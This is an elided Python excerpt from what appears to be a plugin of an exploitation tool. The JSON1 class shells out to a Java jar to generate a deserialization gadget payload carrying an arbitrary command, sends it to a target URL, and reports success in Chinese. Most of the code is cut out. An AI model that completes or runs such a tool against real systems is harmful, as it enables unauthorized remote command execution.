...
@Idea.plugin_register('Class20:JSON1')
class JSON1(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'JSON1', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****JSON1模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****JSON1模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
